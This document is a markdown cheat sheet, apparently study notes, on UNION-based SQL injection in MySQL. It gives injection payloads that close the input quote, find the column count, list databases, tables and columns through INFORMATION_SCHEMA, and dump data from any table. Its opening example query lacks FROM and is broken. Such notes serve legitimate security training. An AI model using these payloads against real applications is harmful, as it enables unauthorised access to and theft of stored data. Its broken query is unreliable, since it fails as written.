## INFORMATION_SCHEMA Database

- Database contains metadata about the databases and tables present on the server.


### Display Table in Another Database

- Displays all the details of the table present in a different database;

```mysql
SELECT * <database_name>.<table_name>;
```


### Display all Databases on the server

- `SCHEMA_NAME` contains all the databases name currently present on the server.

```mysql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

## Payloads for Exploitation

- Below 1,2,3,4 column numbers will vary based on the `UNION` query because `UNION` needs equal column numbers.
- `cn` is for the parameter we pass in the input field and the rest is the payload for exploitation. The `'` sign is to close the input field and start our payload after the `'` sign and ending it with comments `-- '` to invalidate the rest of the logic if present.
- **Remember: UNION needs equal number of columns the thing we want to extract must be inside 1,2,3,4 and also the column needs to display so maintain that order as well.**

### Check Number of Columns

- If `4` gives success message then `4` columns are present but display might show `3` or less ... **it depends and based on the display order set your payload codes.**
- Remember this number will vary so check sequentially ... like 1,2,3,4,5 .....

```mysql
cn' UNION SELECT 1,2,3,4-- '
```


### Payload to Display Databases 

- `SCHEMA_NAME` contains all the databases name currently present on the server.

```mysql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```


### Payload to Display Current Database Name

- `database()` to display current database name.

```mysql
cn' UNION select 1,database(),2,3-- -
```


### Payload to Display Tables in a specific Database

- `TABLE_NAME` contains all the table names.
- `TABLE_SCHEMA` points to the database the table belongs to.
- `SCHEMA_NAME` contains all the databases name currently present on the server.

```mysql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database_name>'-- -
```


### Payload to Display Columns of a specific Table

- `COLUMNS` table contains information about all columns present in all databases.
- `TABLE_NAME` contains all the table names.
- `TABLE_SCHEMA` points to the database the table belongs to.
- `SCHEMA_NAME` contains all the databases name currently present on the server.

```mysql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table_name>'-- -
```


## Payload to Dump Data from a table in another Database

- The column names are of the table you want the data from.
- That is why you need to mention the database name, table name.

```mysql
cn' UNION select 1,<col1_name>, <col2_name>, 4 from <db_name>.<table_name>-- -
```
